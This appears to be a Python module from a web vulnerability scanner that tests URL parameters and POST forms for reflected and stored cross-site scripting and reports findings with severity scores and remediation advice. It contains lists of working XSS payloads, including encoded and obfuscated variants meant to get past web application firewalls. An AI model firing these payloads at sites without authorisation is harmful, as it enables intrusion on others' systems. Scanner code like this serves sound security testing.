"""Cross-Site Scripting (XSS) detection module.

Tests reflected, stored, and DOM-based XSS across all discovered endpoints
and form input fields.
"""

from __future__ import annotations

import re
from typing import Any, Callable
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import httpx

from scanner.utils.logger import get_logger

log = get_logger("xss")

# ── Payloads ────────────────────────────────────────────────────────
REFLECTED_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '{{7*7}}',  # template injection canary
    '<details/open/ontoggle=alert(1)>',
    '<video><source onerror="javascript:alert(1)">',
    '<math><mtext></mtext><script>alert(1)</script></math>',
    "'><svg/onload=confirm(1)>",
    '" autofocus onfocus=alert(1) x="',
    '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
    '<a href="javascript:alert(1)">click</a>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>x</marquee>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>',
    '<form><button formaction="javascript:alert(1)">x</button></form>',
    '<object data="javascript:alert(1)"></object>',
]

ENCODED_PAYLOADS = [
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    '<img src=x onerror="&#x61;lert(1)">',
    "%253Cscript%253Ealert(1)%253C/script%253E",
    "&#x3c;svg onload=alert(1)&#x3e;",
    "%3Csvg%2Fonload%3Dconfirm%601%60%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
    "%22%3E%3Csvg%2Fonload%3Dconfirm%601%60%3E",
    "%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert(1)%3C/script%3E%22%3E%3C/iframe%3E",
    '<svg/onload=alert`1`>',
    '<img src=x onerror=window["al"+"ert"](1)>',
]

# DOM-based XSS detection removed from HTTP module — static source-to-sink
# regex matching produces unacceptable false positive rates on modern web apps
# (React, jQuery, charting libraries all use innerHTML/document.write).
# DOM XSS is properly tested in xss_selenium.py via actual browser execution.


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _test_reflected(
    client: httpx.Client, url: str, param: str, use_waf_bypass: bool = False
) -> dict[str, Any] | None:
    payloads = ENCODED_PAYLOADS if use_waf_bypass else REFLECTED_PAYLOADS
    for payload in payloads:
        target = _inject_param(url, param, payload)
        try:
            resp = client.get(target)
        except httpx.HTTPError:
            continue
        # Check if the payload is reflected unescaped in the response body
        if payload in resp.text:
            log.info("[XSS] Reflected on %s param=%s", url, param)
            return {
                "xss_type": "Reflected",
                "parameter": param,
                "payload": payload,
                "evidence": _snippet(resp.text, payload),
                "url": url,
            }
    return None


def _test_stored(
    client: httpx.Client,
    form: dict[str, Any],
    retrieve_url: str,
) -> dict[str, Any] | None:
    """Submit a payload via POST form, then GET the page to see if it persists."""
    # Use a unique canary so we don't false-positive on other content
    canary = "XSS_CANARY_9a3f"
    payload = f'<script>alert("{canary}")</script>'

    data = {i["name"]: i["value"] for i in form["inputs"] if i["name"]}
    target_param = None
    for inp in form["inputs"]:
        if inp["type"] in ("text", "textarea", "search", "hidden", "") and inp["name"]:
            target_param = inp["name"]
            data[inp["name"]] = payload
            break

    if target_param is None:
        return None

    try:
        client.post(form["action"], data=data)
        resp = client.get(retrieve_url)
    except httpx.HTTPError:
        return None

    if canary in resp.text and payload in resp.text:
        log.info("[XSS] Stored via form %s param=%s", form["action"], target_param)
        return {
            "xss_type": "Stored",
            "parameter": target_param,
            "payload": payload,
            "evidence": _snippet(resp.text, payload),
            "url": form["action"],
        }
    return None





def _snippet(body: str, marker: str, context: int = 80) -> str:
    idx = body.find(marker)
    if idx == -1:
        return ""
    start = max(0, idx - context)
    end = min(len(body), idx + len(marker) + context)
    return body[start:end]


def test_xss(
    endpoints: list[str],
    forms: list[dict[str, Any]],
    waf_detected: bool = False,
    cookie: str | None = None,
    timeout: float = 10.0,
    quick: bool = False,
    should_stop: Callable[[], bool] | None = None,
) -> list[dict[str, Any]]:
    """Run XSS tests against all endpoints and forms.

    Returns a list of confirmed finding dicts.
    """
    findings: list[dict[str, Any]] = []
    seen: set[tuple[str, str]] = set()  # (endpoint_path, param) dedup
    headers: dict[str, str] = {}
    if cookie:
        headers["Cookie"] = cookie

    # In quick mode, limit scope
    test_endpoints = endpoints[:15] if quick else endpoints
    test_forms = forms[:5] if quick else forms

    with httpx.Client(
        verify=False, timeout=timeout, follow_redirects=True, headers=headers
    ) as client:
        # ── Reflected XSS on GET params ─────────────────────────────
        for url in test_endpoints:
            if should_stop and should_stop():
                log.info("XSS scan cancelled during reflected tests")
                break
            params = parse_qs(urlparse(url).query)
            path = urlparse(url).path
            for param in params:
                if should_stop and should_stop():
                    log.info("XSS reflected testing cancelled on %s", path)
                    break
                sig = (path, param)
                if sig in seen:
                    continue
                result = _test_reflected(client, url, param, use_waf_bypass=waf_detected)
                if result:
                    findings.append(_to_finding(result))
                    seen.add(sig)

        # DOM-based XSS: handled by xss_selenium.py (browser execution)
        # Static source-to-sink analysis removed — false positive rate too high

        # ── Stored XSS via forms ────────────────────────────────────
        for form in test_forms:
            if should_stop and should_stop():
                log.info("XSS scan cancelled during stored-form tests")
                break
            if form["method"] != "POST":
                continue
            result = _test_stored(client, form, form["action"])
            if result:
                findings.append(_to_finding(result))

    log.info("XSS scan complete — %d findings", len(findings))
    return findings


def _to_finding(raw: dict[str, Any]) -> dict[str, Any]:
    from scanner.core.cvss_builder import build_finding_cvss
    xss_type = raw["xss_type"]
    type_map = {"Stored": "xss_stored", "DOM-based": "xss_dom", "Reflected": "xss_reflected"}
    vector, score, severity = build_finding_cvss(type_map.get(xss_type, "xss_reflected"))

    return {
        "title": f"{xss_type} XSS on {urlparse(raw['url']).path}",
        "severity": severity,
        "cvss_score": score,
        "cvss_vector": vector,
        "affected_url": raw["url"],
        "parameter": raw["parameter"],
        "payload": raw["payload"],
        "evidence": raw["evidence"][:300],
        "remediation": "Encode all user-supplied output contextually (HTML, JS, URL). "
                       "Implement a strict Content-Security-Policy header.",
        "owasp_category": "A05:2025 - Injection",
    }
